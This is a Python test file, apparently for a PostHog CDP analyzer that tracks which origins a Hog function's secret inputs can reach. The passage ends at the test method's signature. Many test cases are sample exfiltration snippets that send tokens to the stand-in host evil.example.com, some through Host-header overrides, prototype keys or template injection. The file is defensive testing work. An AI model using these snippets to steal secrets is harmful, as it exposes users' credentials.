import sys
import json
import tracemalloc
from collections.abc import Callable, Iterator
from contextlib import AbstractContextManager, contextmanager, nullcontext
from pathlib import Path
from typing import Any
from urllib.parse import urlsplit

from unittest.mock import patch

from django.test import SimpleTestCase

from parameterized import parameterized

from products.cdp.backend.secret_origins import (
    UNBOUND,
    SecretOrigins,
    SecretOriginsAnalysis,
    UnanalyzableReason,
    analyze_secret_origins,
    secret_origins,
    url_origin,
)
from products.cdp.backend.templates import HOG_FUNCTION_TEMPLATES
from products.cdp.backend.templates.hog_function_template import HogFunctionTemplateDC

# The Node worker's tests read the same table, so the origin stored here and the origin the worker compares agree.
ORIGIN_CASES = json.loads(
    (Path(__file__).parents[2] / "shared" / "crosslang" / "secret_origin_cases.json").read_text(encoding="utf-8")
)

SENDS_TOKEN_TO_URL = "fetch(inputs.url, {'headers': {'Authorization': inputs.token}})"

WEBHOOK_HOG = """
let payload := {
  'headers': inputs.headers,
  'body': inputs.body,
  'method': inputs.method
}

if (not empty(inputs.signing_secret)) {
  payload['standard_webhooks'] := {
    'secret_input': 'signing_secret'
  }
}

if (not empty(inputs.secret_headers)) {
  payload['secret_headers_input'] := 'secret_headers'
}

let res := fetch(inputs.url, payload);

if (res.status >= 400) {
  throw Error(f'Webhook failed with status {res.status}: {res.body}');
}
"""


def _inputs(**values: Any) -> dict[str, dict[str, Any]]:
    return {key: {"value": value} for key, value in values.items()}


def _origins(*origins: str) -> frozenset[str]:
    return frozenset(origins)


# Nesting deep enough to pass the default recursion limit can also pass a parser's own nesting limit,
# which reports the code as unparseable instead. A lower limit keeps the nesting shallow.
@contextmanager
def _recursion_limit_above_here(frames: int) -> Iterator[None]:
    depth, frame = 0, sys._getframe()
    while frame.f_back is not None:
        depth, frame = depth + 1, frame.f_back
    previous = sys.getrecursionlimit()
    sys.setrecursionlimit(depth + frames)
    try:
        yield
    finally:
        sys.setrecursionlimit(previous)


class TestSecretHosts(SimpleTestCase):
    @parameterized.expand(
        [
            (
                "literal_url",
                "fetch('https://api.example.com/v1', {'headers': {'Authorization': inputs.token}})",
                _inputs(token="t"),
                {"token"},
                {"token": _origins("https://api.example.com")},
            ),
            (
                "url_input",
                SENDS_TOKEN_TO_URL,
                _inputs(url="https://hooks.example.com/a", token="t"),
                {"token"},
                {"token": _origins("https://hooks.example.com")},
            ),
            (
                "secret_url_input",
                "fetch(inputs.url, {'method': 'POST'})",
                _inputs(url="https://hooks.example.com/abc?key=1"),
                {"url"},
                {"url": _origins("https://hooks.example.com")},
            ),
            (
                "f_string_with_literal_host",
                "fetch(f'https://api.example.com/{event.properties.path}', {'body': inputs.token})",
                _inputs(token="t"),
                {"token"},
                {"token": _origins("https://api.example.com")},
            ),
            (
                "event_controls_the_host",
                SENDS_TOKEN_TO_URL,
                _inputs(url="https://{event.properties.host}/a", token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "host_not_terminated_before_an_unknown_part",
                "fetch(f'https://api.example.com{event.properties.path}', {'body': inputs.token})",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "nullish_fallback",
                "fetch(inputs.url ?? 'https://fallback.example.com', {'body': inputs.token})",
                _inputs(url="https://hooks.example.com/a", token="t"),
                {"token"},
                {"token": _origins("https://hooks.example.com", "https://fallback.example.com")},
            ),
            (
                "helper_function",
                """
                fun send(url, body) {
                  return fetch(url, {'body': body})
                }
                send('https://a.example.com', inputs.token)
                send('https://b.example.com', 'ping')
                """,
                _inputs(token="t"),
                {"token"},
                {"token": _origins("https://a.example.com", "https://b.example.com")},
            ),
            (
                "fetch_as_a_value",
                "let f := fetch\nf('https://hooks.example.com', {'body': inputs.token})",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "fetch_in_a_lambda_with_a_parameter_url",
                "let send := (u) -> fetch(u, {'body': inputs.token})\nsend('https://hooks.example.com')",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "named_lambda_throws_only_its_arguments",
                "let check := (value) -> { if (not value) { throw Error(f'Missing {value}') } }\n"
                f"check(inputs.url)\n{SENDS_TOKEN_TO_URL}",
                _inputs(url="https://hooks.example.com/a", token="t"),
                {"token"},
                {"token": _origins("https://hooks.example.com")},
            ),
            (
                "named_lambda_called_with_a_secret",
                "let send := (x) -> fetch('https://evil.example.com', {'body': x})\nsend(inputs.token)",
                _inputs(token="t"),
                {"token"},
                {"token": _origins("https://evil.example.com")},
            ),
            (
                "named_lambda_passed_as_a_value",
                "let send := (x) -> fetch('https://evil.example.com', {'body': x})\narrayMap(send, [inputs.token])",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "named_lambda_copied_to_another_name",
                "let send := (x) -> fetch('https://evil.example.com', {'body': x})\nlet other := send\n"
                "other(inputs.token)",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "lambda_passed_to_a_lambda_that_calls_it_with_a_secret",
                "let g := (cb) -> cb(inputs.token)\ng((x) -> fetch('https://evil.example.com', {'body': x}))",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "lambda_passed_to_a_function_that_calls_it_with_a_secret",
                "fun g(cb) { cb(inputs.token) }\ng((x) -> fetch('https://evil.example.com', {'body': x}))",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "function_passed_by_name_to_a_lambda",
                "fun send(x) { fetch('https://evil.example.com', {'body': x}) }\n"
                "let g := (cb) -> cb(inputs.token)\ng(send)",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "reduce_feeds_a_lambda_its_own_result",
                "arrayReduce((acc, x) -> { fetch('https://evil.example.com', {'body': acc})\nreturn inputs.token }, "
                "[1, 2], '')",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "webhook_template_resolves_secrets_by_key_name",
                WEBHOOK_HOG,
                {
                    **_inputs(url="https://hooks.example.com/a", method="POST", body={"event": "{event}"}),
                    **_inputs(signing_secret="whsec", secret_headers={"Authorization": "Bearer t"}),
                },
                {"signing_secret", "secret_headers"},
                {
                    "signing_secret": _origins("https://hooks.example.com"),
                    "secret_headers": _origins("https://hooks.example.com"),
                },
            ),
            (
                "two_secrets_to_two_origins",
                """
                fetch('https://a.example.com', {'headers': {'key': inputs.a_key}})
                fetch('https://b.example.com', {'headers': {'key': inputs.b_key}})
                """,
                _inputs(a_key="a", b_key="b"),
                {"a_key", "b_key"},
                {"a_key": _origins("https://a.example.com"), "b_key": _origins("https://b.example.com")},
            ),
            (
                "secret_used_outside_any_fetch",
                """
                if (sha256Hex(inputs.salt) == event.properties.signature) {
                  fetch('https://hooks.example.com', {'body': event.properties})
                }
                """,
                _inputs(salt="s"),
                {"salt"},
                {"salt": _origins()},
            ),
            (
                "secret_printed",
                f"print(base64Encode(inputs.token))\n{SENDS_TOKEN_TO_URL}",
                _inputs(url="https://hooks.example.com", token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "secret_captured_in_an_event",
                "postHogCapture({'event': 'leak', 'properties': {'value': inputs.token}})",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "secret_in_an_error",
                "throw Error(base64Encode(inputs.token))",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "print_called_through_another_name",
                "let log := print\nlog(inputs.token)",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "secret_returned_to_a_webhook_caller",
                "return {'httpResponse': {'status': 200, 'body': inputs.token}}",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "secret_written_into_the_event",
                "event.properties.salt := inputs.salt",
                _inputs(salt="s"),
                {"salt"},
                {"salt": UNBOUND},
            ),
            (
                "digest_of_a_secret_returned_in_the_event",
                "let e := event\ne.properties.id := sha256Hex(concat(e.properties.id, inputs.salt))\nreturn e",
                _inputs(salt="s"),
                {"salt"},
                {"salt": _origins()},
            ),
            (
                "secret_quoted_by_a_parse_error",
                "jsonParse(base64Encode(inputs.token))",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "secret_quoted_by_a_regex_error",
                "if (event.properties.name =~ inputs.token) { return event }",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "secret_passed_to_an_unknown_worker_function",
                "postHogNotYetWritten(inputs.token)",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "secret_passed_to_a_called_expression",
                "let d := {'log': print}\nd.log(inputs.token)",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "secret_quoted_by_an_input_template",
                "fetch('https://api.example.com', {'headers': {'Authorization': inputs.auth}})",
                _inputs(auth="{jsonParse(inputs.token)}", token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "response_forwarded_to_another_origin",
                f"let r := {SENDS_TOKEN_TO_URL}\nfetch('https://evil.example.com', {{'body': r.body}})",
                _inputs(url="https://hooks.example.com", token="t"),
                {"token"},
                {"token": _origins("https://hooks.example.com", "https://evil.example.com")},
            ),
            (
                "input_that_references_a_secret",
                "fetch('https://api.example.com', {'headers': {'Authorization': inputs.auth}})",
                _inputs(auth="Bearer {inputs.token}", token="t"),
                {"token"},
                {"token": _origins("https://api.example.com")},
            ),
            (
                "secret_copied_through_an_index_assignment",
                "let p := {}\np['h'] := inputs.token\nfetch(inputs.url, p)",
                _inputs(url="https://hooks.example.com", token="t"),
                {"token"},
                {"token": _origins("https://hooks.example.com")},
            ),
            (
                "options_from_event_data",
                "fetch('https://evil.example.com', jsonParse(event.properties.p))",
                _inputs(secret_headers={"Authorization": "Bearer t"}),
                {"secret_headers"},
                {"secret_headers": UNBOUND},
            ),
            (
                "computed_option_key",
                "fetch('https://evil.example.com', {concat('secret_', 'headers_input'): concat('secret_', 'headers')})",
                _inputs(secret_headers={"Authorization": "Bearer t"}),
                {"secret_headers"},
                {"secret_headers": UNBOUND},
            ),
            (
                "secret_assigned_into_a_dict_through_an_alias",
                "let h := {}\nlet a := h\na.Authorization := inputs.token\nfetch('https://evil.example.com', {'headers': h})",
                _inputs(token="t"),
                {"token"},
                {"token": _origins("https://evil.example.com")},
            ),
            (
                "secret_assigned_into_a_dict_through_a_parameter",
                """
                let h := {}
                fun put(d) { d.Authorization := inputs.token }
                put(h)
                fetch('https://evil.example.com', {'headers': h})
                """,
                _inputs(token="t"),
                {"token"},
                {"token": _origins("https://evil.example.com")},
            ),
            (
                "secret_assigned_into_a_nested_dict",
                """
                let inner := {}
                let p := {'headers': inner}
                p.headers.Authorization := inputs.token
                fetch('https://evil.example.com', {'headers': inner})
                """,
                _inputs(token="t"),
                {"token"},
                {"token": _origins("https://evil.example.com")},
            ),
            (
                "url_input_reassigned",
                f"inputs.url := 'https://evil.example.com'\n{SENDS_TOKEN_TO_URL}",
                _inputs(url="https://hooks.example.com", token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "url_input_reassigned_through_an_alias",
                f"let i := inputs\ni.url := 'https://evil.example.com'\n{SENDS_TOKEN_TO_URL}",
                _inputs(url="https://hooks.example.com", token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "secret_assigned_through_an_alias_and_printed",
                "let h := {}\nlet a := h\na.Authorization := inputs.token\nprint(h)",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "user_function_named_like_concat",
                "fun concat(a, b) { return 'https://evil.example.com/' }\n"
                "fetch(concat('https://hooks.example.com/', 'x'), {'headers': {'Authorization': inputs.token}})",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "lambda_named_like_coalesce",
                "let coalesce := (a, b) -> 'https://evil.example.com/'\n"
                "fetch(coalesce('https://hooks.example.com/a', 'https://hooks.example.com/b'), {'headers': {'Authorization': inputs.token}})",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "function_declared_twice",
                """
                fun send(url, secret) { fetch(url, {'headers': {'Authorization': secret}}) }
                fun unused() {
                  fun send(ignored, copy) { fetch('https://hooks.example.com', {'headers': {'Authorization': copy}}) }
                }
                send('https://evil.example.com', inputs.token)
                """,
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "option_key_assigned_through_an_index",
                "let p := {}\nlet k := concat('secret_', 'headers_input')\np[k] := concat('secret_', 'headers')\n"
                "fetch('https://evil.example.com', p)",
                _inputs(secret_headers={"Authorization": "Bearer t"}),
                {"secret_headers"},
                {"secret_headers": UNBOUND},
            ),
            (
                "by_name_option_with_a_computed_name",
                "fetch('https://evil.example.com', {'secret_headers_input': concat('secret_', 'headers')})",
                _inputs(secret_headers={"Authorization": "Bearer t"}),
                {"secret_headers"},
                {"secret_headers": UNBOUND},
            ),
            (
                "fetch_without_arguments",
                "fetch()",
                _inputs(token="t"),
                {"token"},
                {"token": _origins()},
            ),
            (
                "fetch_without_arguments_after_an_aliased_write",
                "let h := {}\nlet a := h\na.x := inputs.token\nfetch()",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "fetch_to_a_url_from_event_data",
                "fetch(event.properties.url, {'body': inputs.token})\nfetch(event.properties.url)",
                _inputs(token="t", salt="s"),
                {"token", "salt"},
                {"token": UNBOUND, "salt": _origins()},
            ),
            (
                "liquid_input_that_dumps_every_input",
                "fetch(inputs.url, {'method': 'POST'})",
                {"url": {"value": "https://evil.example.com/{{ inputs | json }}", "templating": "liquid"}},
                {"api_key"},
                {"api_key": _origins("https://evil.example.com")},
            ),
            (
                "input_that_indexes_a_secret",
                "fetch(inputs.url, {'method': 'POST'})",
                _inputs(url="https://hooks.example.com/{inputs['token']}", token="t"),
                {"token"},
                {"token": _origins("https://hooks.example.com")},
            ),
            (
                "secret_serialized_into_a_json_body",
                "fetch('https://api.example.com', {'body': jsonStringify({'k': inputs.token})})",
                _inputs(token="t"),
                {"token"},
                {"token": _origins("https://api.example.com")},
            ),
            (
                # The Node VM reads an input shaped like a date as a date, and its date library quotes
                # an invalid year in the error it throws.
                "secret_converted_to_an_integer",
                "fetch('https://api.example.com', {'body': {'id': toInt(inputs.when)}})",
                _inputs(when={"__hogDate__": True, "year": "{inputs.token}", "month": 1, "day": 1}, token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "secret_converted_to_a_float",
                "fetch('https://api.example.com', {'body': {'rate': toFloat(inputs.when)}})",
                _inputs(when={"__hogDate__": True, "year": "{inputs.token}", "month": 1, "day": 1}, token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "secret_compared_inside_a_date_input",
                "if (inputs.when < 5) { print('soon') }\nfetch('https://api.example.com', {'body': inputs.token})",
                _inputs(when={"__hogDate__": True, "year": "{inputs.token}", "month": 1, "day": 1}, token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "secret_inside_a_date_input_compared_by_range",
                "if (inputs.when between 1 and 2) { print('soon') }\nfetch('https://api.example.com', {'body': inputs.token})",
                _inputs(when={"__hogDate__": True, "year": "{inputs.token}", "month": 1, "day": 1}, token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "secret_inside_a_date_input_compared_by_an_input_template",
                "fetch('https://api.example.com', {'body': inputs.token, 'soon': inputs.note})",
                _inputs(
                    note="{inputs.when between 1 and 2}",
                    when={"__hogDate__": True, "year": "{inputs.token}", "month": 1, "day": 1},
                    token="t",
                ),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "secret_compared_inside_a_date_built_in_code",
                "let d := {'__hogDate__': true, 'year': inputs.token, 'month': 1, 'day': 1}\nlet same := d == 'x'",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "secret_compared_with_a_request_header",
                "if (inputs.token != request.headers['authorization']) { return null }\n"
                "fetch('https://api.example.com', {'body': lower(inputs.token)})",
                _inputs(token="t"),
                {"token"},
                {"token": _origins("https://api.example.com")},
            ),
            (
                "fetch_in_an_inline_element_callback",
                "arrayMap((x) -> fetch('https://hooks.example.com', {'body': x}), [inputs.token])",
                _inputs(token="t"),
                {"token"},
                {"token": _origins("https://hooks.example.com")},
            ),
            (
                "secret_printed_in_an_inline_element_callback",
                "arrayFilter((x) -> { print(x)\nreturn true }, [inputs.token])",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "response_forwarded_through_a_function",
                f"fun relay(res) {{ return res.body }}\nlet r := {SENDS_TOKEN_TO_URL}\n"
                "fetch('https://evil.example.com', {'body': relay(r)})",
                _inputs(url="https://hooks.example.com", token="t"),
                {"token"},
                {"token": _origins("https://hooks.example.com", "https://evil.example.com")},
            ),
            (
                "digest_forwarded_through_a_lambda",
                "let sign := (v) -> sha256Hex(v)\nfetch('https://evil.example.com', {'body': sign(inputs.salt)})",
                _inputs(salt="s"),
                {"salt"},
                {"salt": _origins("https://evil.example.com")},
            ),
            (
                "response_logged_through_a_function",
                f"fun relay(res) {{ return res.body }}\nlet r := {SENDS_TOKEN_TO_URL}\nprint(relay(r))",
                _inputs(url="https://hooks.example.com", token="t"),
                {"token"},
                {"token": _origins("https://hooks.example.com")},
            ),
            (
                "digest_logged_through_a_lambda",
                "let sign := (v) -> sha256Hex(v)\nprint(sign(inputs.salt))",
                _inputs(salt="s"),
                {"salt"},
                {"salt": _origins()},
            ),
            (
                "secret_used_as_a_computed_key",
                "let d := {}\nd[inputs.token] := 1\nfetch('https://evil.example.com', {'body': jsonStringify(d)})",
                _inputs(token="t"),
                {"token"},
                {"token": _origins("https://evil.example.com")},
            ),
            (
                "secret_used_as_a_nested_computed_key",
                "let d := {'a': {}}\nd.a[inputs.token] := 1\nprint(d)",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "secret_converted_to_text_inside_a_query_shaped_dict",
                "toString({'__hx_ast': base64Encode(inputs.token)})",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "secret_concatenated_inside_a_query_shaped_dict",
                "let label := f'id { {'__hx_ast': inputs.token} }'",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "secret_concatenated_inside_a_query_shaped_input",
                "fetch('https://api.example.com', {'body': toString(inputs.shaped)})",
                _inputs(shaped={"__hx_ast": "{inputs.token}"}, token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "secret_concatenated_through_a_parameter",
                "fun hashed(value, salt) { return sha256Hex(concat(value, salt)) }\n"
                "let e := event\ne.distinct_id := hashed(event.distinct_id, inputs.salt)\nreturn e",
                _inputs(salt="s"),
                {"salt"},
                {"salt": _origins()},
            ),
            (
                "query_shaped_dict_concatenated_through_a_parameter",
                "fun label(value) { return concat('id ', value) }\nlabel({'__hx_ast': inputs.token})",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "secret_converted_to_text_for_a_header",
                "fetch('https://api.example.com', {'headers': {'Authorization': concat('Bearer ', toString(inputs.token))}})",
                _inputs(token="t"),
                {"token"},
                {"token": _origins("https://api.example.com")},
            ),
            (
                "digest_of_a_slice_of_a_secret_logged",
                "print(sha256Hex(substring(inputs.token, 1, 1)))",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "digest_of_a_secret_with_text_removed_logged",
                "let rest := replaceAll(inputs.token, 'ab', '')\nprint(sha256Hex(rest))",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "digest_of_a_comparison_with_a_secret_logged",
                "print(md5Hex(toString(inputs.token < 'm')))",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "slice_of_a_secret_sent_to_its_host",
                "fetch('https://api.example.com', {'headers': {'Authorization': substring(inputs.token, 5)}})",
                _inputs(token="t"),
                {"token"},
                {"token": _origins("https://api.example.com")},
            ),
            (
                "url_doubled_until_it_is_very_long",
                "let a0 := 'https://hooks.example.com/'\n"
                + "".join(f"let a{n} := concat(a{n - 1}, a{n - 1})\n" for n in range(1, 41))
                + "fetch(a40, {'body': inputs.token})",
                _inputs(token="t"),
                {"token"},
                {"token": _origins("https://hooks.example.com")},
            ),
            (
                "host_header_names_another_host",
                "fetch('https://hooks.example.com', {'headers': {'Host': 'evil.example.com', 'Authorization': inputs.token}})",
                _inputs(token="t"),
                {"token"},
                {"token": _origins("https://hooks.example.com", "https://evil.example.com")},
            ),
            (
                "lowercase_host_header_with_a_port",
                "fetch('https://hooks.example.com', {'headers': {'host': 'evil.example.com:8443', 'Authorization': inputs.token}})",
                _inputs(token="t"),
                {"token"},
                {"token": _origins("https://hooks.example.com", "https://evil.example.com:8443")},
            ),
            (
                "authority_header",
                "fetch('https://hooks.example.com', {'headers': {':authority': 'evil.example.com'}, 'body': inputs.token})",
                _inputs(token="t"),
                {"token"},
                {"token": _origins("https://hooks.example.com", "https://evil.example.com")},
            ),
            (
                "host_header_from_an_input",
                "fetch('https://hooks.example.com', {'headers': {'Host': inputs.target}, 'body': inputs.token})",
                _inputs(token="t", target="evil.example.com"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "headers_from_event_data",
                "fetch('https://hooks.example.com', {'headers': event.properties.headers, 'body': inputs.token})",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "host_header_assigned_into_a_dict",
                "let h := {}\nh['Host'] := 'evil.example.com'\nfetch('https://hooks.example.com', {'headers': h, 'body': inputs.token})",
                _inputs(token="t"),
                {"token"},
                {"token": _origins("https://hooks.example.com", "https://evil.example.com")},
            ),
            (
                "header_assigned_with_a_computed_name",
                "let h := {}\nh[event.properties.name] := 'evil.example.com'\nfetch('https://hooks.example.com', {'headers': h, 'body': inputs.token})",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "headers_replaced_through_an_alias",
                "let o := {'headers': {'Authorization': inputs.token}}\nlet a := o\na.headers := {'Host': 'evil.example.com'}\nfetch('https://hooks.example.com', o)",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "host_header_assigned_through_an_alias",
                "let h := {}\nlet a := h\na.Host := 'evil.example.com'\nfetch('https://hooks.example.com', {'headers': h, 'body': inputs.token})",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "host_header_assigned_into_options",
                "let p := {'headers': {}, 'body': inputs.token}\np.headers.Host := 'evil.example.com'\nfetch('https://hooks.example.com', p)",
                _inputs(token="t"),
                {"token"},
                {"token": _origins("https://hooks.example.com", "https://evil.example.com")},
            ),
            (
                "host_header_in_a_dictionary_input",
                "fetch('https://hooks.example.com', {'headers': inputs.headers, 'body': inputs.token})",
                _inputs(token="t", headers={"Host": "evil.example.com"}),
                {"token"},
                {"token": _origins("https://hooks.example.com", "https://evil.example.com")},
            ),
            (
                "templated_host_header_in_a_dictionary_input",
                "fetch('https://hooks.example.com', {'headers': inputs.headers, 'body': inputs.token})",
                _inputs(token="t", headers={"Host": "{event.properties.host}"}),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "empty_dictionary_input_as_headers",
                "fetch('https://hooks.example.com', {'headers': inputs.headers, 'body': inputs.token})",
                _inputs(token="t", headers=None),
                {"token"},
                {"token": _origins("https://hooks.example.com")},
            ),
            (
                "host_header_written_into_a_dictionary_input_through_an_alias",
                "let h := inputs.headers\nh.Host := 'evil.example.com'\nfetch('https://hooks.example.com', {'headers': inputs.headers, 'body': inputs.token})",
                _inputs(token="t", headers={"X-Id": "1"}),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "null_options_and_headers",
                "fetch('https://hooks.example.com', null)\nfetch('https://hooks.example.com', {'headers': null, 'body': inputs.token})",
                _inputs(token="t"),
                {"token"},
                {"token": _origins("https://hooks.example.com")},
            ),
            (
                "host_header_in_options_from_coalesce",
                "fetch('https://hooks.example.com', coalesce(null, {'headers': {'Host': 'evil.example.com'}, 'body': inputs.token}))",
                _inputs(token="t"),
                {"token"},
                {"token": _origins("https://hooks.example.com", "https://evil.example.com")},
            ),
            (
                "host_header_in_options_from_if",
                "fetch('https://hooks.example.com', if(event.event == 'a', {'body': inputs.token}, {'headers': {'Host': 'evil.example.com'}, 'body': inputs.token}))",
                _inputs(token="t"),
                {"token"},
                {"token": _origins("https://hooks.example.com", "https://evil.example.com")},
            ),
            (
                "options_from_a_recursive_function",
                "fun options() { return options() }\nfetch('https://hooks.example.com', options())\nfetch('https://hooks.example.com', {'body': inputs.token})",
                _inputs(token="t"),
                {"token"},
                {"token": _origins("https://hooks.example.com")},
            ),
            (
                "secret_read_by_a_constant_key",
                "fetch('https://hooks.example.com', {'body': inputs['token']})",
                _inputs(token="t"),
                {"token"},
                {"token": _origins("https://hooks.example.com")},
            ),
            (
                "secret_read_by_a_computed_key",
                "let k := 'token'\nfetch('https://evil.example.com', {'body': inputs[k]})",
                _inputs(token="t"),
                {"token"},
                {"token": _origins("https://evil.example.com")},
            ),
            (
                "every_input_sent",
                "fetch('https://hooks.example.com', {'body': inputs})",
                _inputs(token="t"),
                {"token"},
                {"token": _origins("https://hooks.example.com")},
            ),
            (
                "secret_written_into_a_tuple",
                "let t := (1, 2)\nt.1 := inputs.token\nfetch('https://hooks.example.com', {'body': t})",
                _inputs(token="t"),
                {"token"},
                {"token": _origins("https://hooks.example.com")},
            ),
            (
                "caught_error_sent",
                "try {\n  fetch('https://hooks.example.com', {'body': inputs.token})\n} catch (e) {\n  fetch('https://evil.example.com', {'body': e})\n}",
                _inputs(token="t"),
                {"token"},
                {"token": _origins("https://hooks.example.com", "https://evil.example.com")},
            ),
            (
                "liquid_url_without_tags",
                "fetch(inputs.url, {'body': inputs.token})",
                {"url": {"value": "https://hooks.example.com/a", "templating": "liquid"}, "token": {"value": "t"}},
                {"token"},
                {"token": _origins("https://hooks.example.com")},
            ),
            (
                "unparsable_url_template",
                "fetch(inputs.url, {'body': inputs.token})",
                _inputs(url="https://hooks.example.com/{", token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "compared_names_that_feed_each_other",
                "let a := 'x'\nlet b := a\na := b\nif (a == 'x') { fetch('https://hooks.example.com', {'body': inputs.token}) }",
                _inputs(token="t"),
                {"token"},
                {"token": _origins("https://hooks.example.com")},
            ),
            (
                "compared_liquid_input",
                "if (inputs.mode == 'x') { fetch('https://hooks.example.com', {'body': inputs.token}) }",
                {"token": {"value": "t"}, "mode": {"value": "{{ inputs.token }}", "templating": "liquid"}},
                {"token"},
                {"token": _origins("https://hooks.example.com")},
            ),
            (
                "compared_unparsable_input_that_names_the_secret",
                "if (inputs.mode == 'x') { fetch('https://hooks.example.com', {'body': inputs.token}) }",
                _inputs(token="t", mode="{inputs.token"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "options_that_contain_themselves",
                "let o := {'body': inputs.token}\no.headers := o\nfetch('https://hooks.example.com', o)",
                _inputs(token="t"),
                {"token"},
                {"token": _origins("https://hooks.example.com")},
            ),
            (
                "declared_without_a_value",
                "let u\nu := concat(u, 'https://evil.example.com')\nfetch(u, {'body': inputs.token})",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "digest_of_a_remainder_of_the_secret",
                "print(sha256Hex(jsonStringify(inputs.token % 10)))",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "digest_of_a_character_of_the_secret",
                "print(sha256Hex(inputs.token[1]))",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "untemplated_url_input",
                "fetch(inputs.url, {'body': inputs.token})",
                {
                    "url": {"value": "https://{inputs.prefix}@evil.example.com/", "templating": False},
                    "prefix": {"value": "trusted.example.com/#"},
                    "token": {"value": "t"},
                },
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "input_the_worker_turns_into_a_boolean",
                "fetch(concat('https://', inputs.target, '.example.com/'), {'body': inputs.token})",
                {"target": {"value": "1", "schema_type": "boolean"}, "token": {"value": "t"}},
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "host_header_in_returned_options",
                "fun options() { return {'headers': {'Host': 'evil.example.com'}, 'body': inputs.token} }\nfetch('https://hooks.example.com', options())",
                _inputs(token="t"),
                {"token"},
                {"token": _origins("https://hooks.example.com", "https://evil.example.com")},
            ),
            (
                "headers_without_a_host",
                "let p := {'headers': inputs.headers, 'body': inputs.token}\np.headers.Authorization := 'x'\nfetch('https://hooks.example.com', p)",
                _inputs(token="t", headers={"Content-Type": "application/json"}),
                {"token"},
                {"token": _origins("https://hooks.example.com")},
            ),
            (
                "host_header_in_secret_headers_named_by_options",
                "fetch('https://hooks.example.com', {'secret_headers_input': 'secret_headers'})",
                _inputs(secret_headers={"Host": "evil.example.com", "Authorization": "Bearer t"}),
                {"secret_headers"},
                {"secret_headers": _origins("https://hooks.example.com", "https://evil.example.com")},
            ),
            (
                "host_header_in_an_expanded_dictionary_input",
                "fetch('https://hooks.example.com', {'headers': inputs.headers, 'body': inputs.token})",
                _inputs(token="t", headers={"$$_extend_object": "{ {'Host': 'evil.example.com'} }"}),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "host_header_behind_a_prototype_key_in_a_dictionary_input",
                "fetch('https://hooks.example.com', {'headers': inputs.headers, 'body': inputs.token})",
                _inputs(token="t", headers={"__proto__": {"Host": "evil.example.com"}}),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "secret_logged_through_a_lambda",
                "let same := (v) -> v\nprint(same(inputs.salt))",
                _inputs(salt="s"),
                {"salt"},
                {"salt": UNBOUND},
            ),
        ]
    )
    def test_secret_origins(
        self, _name: str, hog: str, inputs: dict, secret_keys: set[str], expected: dict[str, SecretOrigins]
    ) -> None:
